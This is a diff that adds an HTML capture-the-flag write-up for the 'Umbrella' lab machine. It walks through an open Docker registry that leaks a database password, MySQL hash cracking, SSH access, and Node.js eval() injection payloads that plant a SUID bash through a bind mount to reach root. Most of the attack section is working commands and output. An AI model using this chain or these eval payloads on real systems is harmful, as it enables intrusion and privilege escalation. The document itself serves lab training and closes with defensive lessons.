@@ -1,0 +1,61 @@
+<!--
+  writeups/umbrella.html - content fragment (loaded into the modal)
+  New writeup? Copy writeups/template.html -> writeups/<slug>.html.
+-->
+<h2>Umbrella — Docker Registry to SUID Bash</h2>
+<p>A time-tracking app rebuilt around Docker: an open registry leaks DB secrets, MySQL hands over login credentials, a Node.js <code>eval()</code> gives container root, and a bind-mounted logs folder pivots to host root. Goal: user.txt + root.txt.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-func">nmap</span> -sC -sV umbrella.thm
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1
+3306/tcp open  mysql   5.7.40
+5000/tcp open  http    Docker Registry v2
+8080/tcp open  http    Node.js/Express login</code></pre>
+
+<h3>2 · Docker Registry Loot</h3>
+<p>Port 5000 is an unauthenticated Registry. The manifest's <code>history</code> payload carries the image's build-time <code>ENV</code> — the DB password leaks with zero image downloads.</p>
+<pre><code><span class="tok-func">curl</span> http://umbrella.thm:5000/v2/_catalog
+<span class="tok-comment"># {"repositories":["umbrella/timetracking"]}</span>
+
+<span class="tok-func">curl</span> http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest
+<span class="tok-comment"># history[].v1Compatibility → Env →</span>
+<span class="tok-comment"># DB_HOST=db  DB_USER=root  DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5</span></code></pre>
+
+<h3>3 · MySQL — Dump + Crack</h3>
+<pre><code><span class="tok-func">mysql</span> -h umbrella.thm -u root -p<span class="tok-string">'Ng1-f3!Pe7-e5?Nf3xe5'</span>
+&gt; SHOW DATABASES;
+&gt; USE timetracking; SELECT * FROM users;
+
+<span class="tok-comment"># MD5 hashes → crack with john + rockyou</span>
+<span class="tok-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+<span class="tok-comment"># claire-r:Password1  chris-r:sunshine1  jill-v:letmein  barry-b:sandwich</span></code></pre>
+
+<h3>4 · SSH + Source Review</h3>
+<pre><code><span class="tok-func">ssh</span> claire-r@umbrella.thm
+<span class="tok-func">cat</span> user.txt
+
+<span class="tok-comment"># App source is in the home dir — read tTracker-src/</span>
+<span class="tok-func">cat</span> tTracker-src/app.js
+<span class="tok-comment"># /time: let timeCalc = parseInt(eval(request.body.time))  ← eval!</span>
+
+<span class="tok-func">cat</span> tTracker-src/docker-compose.yml
+<span class="tok-comment"># app volume:  ./logs:/logs   ← host dir name claire-r can write</span></code></pre>
+<p>Wait — the <code>logs/</code> directory is bind-mounted into the container at <code>/logs</code>. Anything the container writes there lands on the host, owned by root.</p>
+
+<h3>5 · eval() → SUID Root Bash</h3>
+<p>On the web app (<code>:8080</code>), log in as claire-r. The "Increase time spent" field is passed straight to <code>eval()</code> — the app even advertises math expressions. We use it to run <code>child_process</code> and plant a SUID bash on the host through the bind mount (no reverse shell needed).</p>
+<pre><code><span class="tok-comment"># Submit each of these in the time field (POST /time)</span>
+require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'cp /bin/bash /logs/bash'</span>)
+require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'chown root:root /logs/bash'</span>)
+require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'chmod u+s /logs/bash'</span>)
+
+<span class="tok-comment"># On the host as claire-r</span>
+<span class="tok-func">~/tTracker-src/logs/bash</span> -p
+bash-<span class="tok-num">5.1</span># <span class="tok-func">id</span>
+uid=<span class="tok-num">1001</span>(claire-r) euid=<span class="tok-num">0</span>(root)
+bash-<span class="tok-num">5.1</span># <span class="tok-func">cat</span> /root/root.txt</code></pre>
+<p>Because the app runs as root, <code>chown/chmod</code> succeed; <code>bash -p</code> keeps the elevated euid. Alternatively the same <code>eval()</code> can spawn a reverse shell inside the container.</p>
+
+<h3>6 · Retrospective</h3>
+<p>Attack chain: open Registry → ENV secret leak → MySQL dump → hash crack → <code>eval()</code> RCE → bind-mount SUID pivot. Lessons: never bake secrets into image ENV, gate your registry, ban <code>eval()</code> on user input, and bind mounts hand root from container to host.</p>
